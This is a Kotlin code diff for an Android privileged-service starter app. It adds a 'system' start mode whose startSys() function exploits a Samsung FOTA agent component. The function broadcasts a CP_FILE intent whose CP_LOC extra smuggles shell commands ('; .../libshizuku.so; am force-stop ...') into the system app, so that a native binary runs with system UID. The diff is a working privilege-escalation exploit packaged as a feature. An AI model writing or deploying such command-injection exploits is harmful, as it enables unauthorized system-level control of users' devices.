@@ -108,6 +108,7 @@ class StarterActivity : AppBarActivity() {
             
             viewModel.start(
                 intent.getBooleanExtra(EXTRA_IS_ROOT, false),
+                intent.getBooleanExtra(EXTRA_IS_SYSTEM, false),
                 port
             )
         }
@@ -115,6 +116,7 @@ class StarterActivity : AppBarActivity() {
 
     companion object {
 
+        const val EXTRA_IS_SYSTEM = "$EXTRA.IS_SYSTEM"
         const val EXTRA_IS_ROOT = "$EXTRA.IS_ROOT"
         const val EXTRA_PORT = "$EXTRA.PORT"
     }
@@ -139,12 +141,14 @@ class ViewModel(application: Application) : AndroidViewModel(application) {
 
     private var started = false
     private var lastRoot = false
+    private var lastSystem = false
     private var lastPort = 0
 
-    fun start(root: Boolean, port: Int) {
+    fun start(root: Boolean, isSystem: Boolean, port: Int) {
         lastRoot = root
+        lastSystem = isSystem
         lastPort = port
-        if (!root && port !in 1..65535) {
+        if (!root && !isSystem && port !in 1..65535) {
             log(error = IllegalArgumentException("Invalid port value: $port. Port must be between 1 and 65535."))
             return
         }
@@ -153,6 +157,7 @@ class ViewModel(application: Application) : AndroidViewModel(application) {
 
         viewModelScope.launch(handler) {
             if (root) startRoot()
+            else if (isSystem) startSys()
             else AdbStarter.startAdb(appContext, port, { log(it) })
             Starter.waitForBinder({ log(it) })
         }
@@ -162,7 +167,33 @@ class ViewModel(application: Application) : AndroidViewModel(application) {
         started = false
         sb.clear()
         _output.postValue(Resource.success(sb))
-        start(lastRoot, lastPort)
+        start(lastRoot, lastSystem, lastPort)
+    }
+
+    private suspend fun startSys() {
+        log("Attempting Samsung System UID Escalation via FOTA agent...\n\n")
+
+        withContext(Dispatchers.IO) {
+            val intent = android.content.Intent().apply {
+                setClassName("com.sdet.fotaagent", "com.sdet.fotaagent.Main")
+                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            appContext.startActivity(intent)
+
+            val mIntent = android.content.Intent("com.sdet.fotaagent.intent.CP_FILE")
+            mIntent.putExtra("CP_FILE", "/data")
+            mIntent.putExtra("CP_LOC", "; " + appContext.applicationInfo.nativeLibraryDir
+                    + "/libshizuku.so" + "; am force-stop com.sdet.fotaagent")
+            try {
+                kotlinx.coroutines.delay(1000)
+                appContext.sendBroadcast(mIntent)
+                log("FOTA command broadcast sent!\n\n")
+                log("info: shizuku_starter exit with 0")
+            } catch (e: Exception) {
+                log(error = e)
+                log("Samsung System UID Escalation failed!\n")
+            }
+        }
     }
 
     private fun log(line: String? = null, error: Throwable? = null) {
